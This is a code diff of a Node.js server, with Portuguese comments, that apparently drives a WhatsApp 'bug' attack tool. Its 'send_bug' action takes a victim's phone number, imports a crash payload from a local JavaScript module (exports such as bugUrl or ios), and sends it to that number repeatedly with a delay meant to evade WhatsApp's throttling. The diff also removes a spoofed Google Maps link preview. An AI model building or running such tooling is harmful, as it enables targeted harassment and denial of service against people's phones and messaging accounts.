@@ -141,55 +141,41 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo de Payload com suporte a arquivos .js e .txt
+                // Disparo focado na importação de Módulos JavaScript (.js)
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivo = extraData.file;
                     const quantidade = parseInt(extraData.amount) || 1;
 
-                    let payloadText = "https://maps.google.com\n⚠️ Payload ZRX";
+                    let payloadText = "https://maps.google.com/maps?q=0,0\n⚠️ Payload ZRX";
 
                     try {
-                        const filePath = path.join(__dirname, nomeArquivo);
+                        // Trata a extensão para fazer o require correto do arquivo .js
+                        const nomeModulo = nomeArquivo.replace(/\.js$/, '');
+                        const caminhoAbsoluto = path.join(__dirname, `${nomeModulo}.js`);
 
-                        // Tenta importar se for um arquivo JavaScript (.js)
-                        if (nomeArquivo.endsWith('.js') || fs.existsSync(filePath + '.js')) {
-                            const nomeModulo = nomeArquivo.replace(/\.js$/, '');
-                            
-                            // Limpa o cache do require para ler sempre a versão mais recente
+                        if (fs.existsSync(caminhoAbsoluto)) {
+                            // Limpa o cache para sempre carregar atualizações do módulo
                             delete require.cache[require.resolve(`./${nomeModulo}`)];
                             const modulo = require(`./${nomeModulo}`);
 
                             if (typeof modulo === 'string') {
                                 payloadText = modulo;
                             } else if (typeof modulo === 'object' && modulo !== null) {
-                                // Puxa qualquer variável exportada no arquivo (ex: bugUrl, ios, payload, etc)
+                                // Puxa a variável exportada no arquivo JS (bugUrl, ios, payload, etc)
                                 payloadText = modulo.bugUrl || modulo.ios || modulo.payload || modulo.default || Object.values(modulo)[0] || payloadText;
                             }
-                        } else if (fs.existsSync(filePath)) {
-                            // Leitura padrão para arquivos de texto (.txt)
-                            payloadText = fs.readFileSync(filePath, 'utf8');
                         }
                     } catch (err) {
-                        console.error("Erro ao carregar o arquivo do payload:", err.message);
+                        console.error("Erro ao importar o módulo .js:", err.message);
                     }
 
-                    // Extrai a primeira linha para a pré-visualização do link
-                    const primeiraLinha = payloadText.split('\n')[0].trim();
-
                     for (let i = 0; i < quantidade; i++) {
-                        await waSock.sendMessage(targetJid, { 
-                            text: payloadText,
-                            linkPreview: {
-                                "canonical-url": "https://maps.google.com",
-                                "matched-text": primeiraLinha.startsWith('http') ? primeiraLinha : "https://maps.google.com",
-                                "title": "Google Maps",
-                                "description": "Localização",
-                                "jpegThumbnail": null
-                            }
-                        });
+                        // Enviamos a string direta carregada do módulo JS.
+                        // O motor nativo do WhatsApp lerá a primeira linha (URL) e gerará o card do mapa.
+                        await waSock.sendMessage(targetJid, { text: payloadText });
                         
-                        // Delay mantido em 3 segundos (3000ms) para evitar o bloqueio por "Aguardando mensagem"
+                        // Intervalo fixo de 3 segundos para evitar o bug de sincronização criptográfica
                         await delay(3000);
                     }
 
